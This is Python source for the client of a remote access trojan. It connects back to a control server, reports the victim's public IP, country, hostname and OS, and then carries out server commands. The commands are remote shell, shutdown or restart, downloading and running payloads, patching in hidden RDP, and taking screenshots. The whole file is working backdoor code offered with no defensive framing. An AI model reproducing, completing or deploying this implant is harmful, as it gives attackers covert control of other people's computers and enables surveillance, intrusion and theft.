import socket
from Modules import shell as Shell, power as Power, execute as Execute, hrdp as HRDP, screenshot as Screenshot
from time import sleep
from requests import get
from json import loads
from platform import platform
from zlib import compress, decompress

BUFFER_SIZE = 1024
RECONNECT_TIMER = 10
SERVER_ADDRESS = '127.0.0.1'


class Client:
    def __init__(self, ip, port):
        """
        This will initiate the connection to the server
        :param ip: ip address of the server
        :param port: port of the server
        """
        self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client_socket.connect((ip, port))
        print('Connected successfully to the server')

    def close(self):
        """ Closes the connection to the server """
        self.client_socket.close()

    def send(self, message):
        """
        Sends a message in small chunks to the server
        :param message: Message to send to the server (bytes/str)
        """
        message = message.encode() if type(message) != bytes else message
        message = compress(message, level=6)  # Compress the sent data
        if len(message) % BUFFER_SIZE == 0:
            message = message + '.'.encode()
        while message:
            self.client_socket.send(message[:BUFFER_SIZE])
            message = message[BUFFER_SIZE:]

    def receive(self, as_bytes=False):
        """
        Receive a message in small chunks from the Server
        :param as_bytes: If set to True, this function will return the data as bytes. Default=False
        """
        chunk = self.client_socket.recv(BUFFER_SIZE)
        data = chunk
        while len(chunk) == BUFFER_SIZE:
            chunk = self.client_socket.recv(BUFFER_SIZE)
            print(chunk)  # Doesn't work without this, I don't know why, and I'm too lazy to fix it
            if chunk != '.'.encode():
                data += chunk
        data = decompress(data)  # Decompress the received data
        return data if as_bytes else data.decode()


def main():
    """ Connects to the server and send it info about the system """
    try:
        # Connect to server
        client = Client(SERVER_ADDRESS, 8000)

        # Send client info to the server - IP, Country Code, Name, Os
        response = loads(get('http://ip-api.com/json/?fields=status,countryCode,query').text)
        if response['status'] == 'success':
            client.send('{},{},{},{}'.format(response['query'], response['countryCode'], socket.gethostname(), platform()))

            # Respond to server requests
            while True:
                cmd = client.receive().split(maxsplit=1)
                print(cmd)
                if cmd[0] == 'shell':
                    Shell.shell(client, cmd[1])
                elif cmd[0] == 'restart':
                    Power.restart()
                elif cmd[0] == 'shutdown':
                    Power.shutdown()
                elif cmd[0] == 'execute':
                    Execute.download_and_execute(client)
                elif cmd[0] == 'hrdp':
                    HRDP.patch(client, cmd[1])
                elif cmd[0] == 'screenshot':
                    Screenshot.take_screenshot(client)
                else:
                    client.send('[!] Unconfigured option')
        else:
            print('Error obtaining client data... Trying to reconnect...')
            sleep(RECONNECT_TIMER * 10)
    except socket.error:
        print('Connection lost... Trying to reconnect...')
        sleep(RECONNECT_TIMER)
        main()


if __name__ == "__main__":
    main()
